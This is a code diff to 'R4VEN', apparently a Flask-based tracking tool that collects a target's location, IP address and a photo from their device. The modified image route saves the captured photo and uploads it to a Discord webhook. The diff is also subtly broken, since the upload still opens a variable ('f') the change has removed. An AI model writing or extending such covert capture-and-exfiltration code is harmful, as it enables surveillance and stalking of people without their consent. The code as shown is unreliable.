@@ -12,7 +12,7 @@ import time
 from flaredantic import FlareTunnel, FlareConfig
 from flask import Flask, request, Response, send_from_directory
 import signal
-from utils import get_file_data, update_webhook, check_and_get_webhook_url, DISCORD_WEBHOOK_FILE_NAME
+from utils import get_file_data, update_webhook, check_and_get_webhook_url
 
 # Global flag to handle graceful shutdown
 shutdown_flag = threading.Event()
@@ -32,6 +32,10 @@ else:
     R = G = C = W = Y = M = B = ''
 
 app = Flask(__name__)
+
+# --- Add a global var for cloudinary status ---
+g_cloudinary_enabled = False
+# ---------------------------------------------
 
 parser = argparse.ArgumentParser(
     description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
@@ -94,20 +98,22 @@ def update_location():
 @app.route('/image', methods=['POST'])
 def image():
     i = request.files['image']
-    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
-    i.save('%s/%s' % (os.getcwd(), f))
-    #print(f"{B}[+] {C}Picture of the target captured and saved")
+    # Define a snapshots directory
+    snapshots_dir = os.path.join(os.getcwd(), "snapshots")
+    if not os.path.exists(snapshots_dir):
+        os.makedirs(snapshots_dir)
 
-    try:
-        with open(os.path.join(os.getcwd(), "iwebhook.js"), "r") as file:
-            webhook_url = file.read().strip()
-    except FileNotFoundError:
-        webhook_url = check_and_get_webhook_url(os.getcwd())
-    
+    # Save the image locally first
+    filename = '%s.jpeg' % time.strftime("%Y%m%d-%H%M%S")
+    local_path = os.path.join(snapshots_dir, filename)
+    i.save(local_path)
+    print(f"{B}[+] {C}Picture captured and saved locally to {local_path}{W}")
+
+    webhook_url = check_and_get_webhook_url(os.getcwd())
     files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
     response = requests.post(webhook_url, files=files)
 
-    return Response("%s saved and sent to Discord webhook" % f)
+    return Response("Image processed and status sent to Discord webhook.", content_type="text/plain")
 
 @app.route('/get_target', methods=['GET'])
 def get_url():
@@ -138,7 +144,6 @@ def serve_appjs():
 
 #run_flask function to handle threading
 def run_flask(folder_name):
-    global MODULE_DIR
     try:
         os.chdir(folder_name)
         MODULE_DIR = os.path.abspath(os.getcwd())  # store absolute path
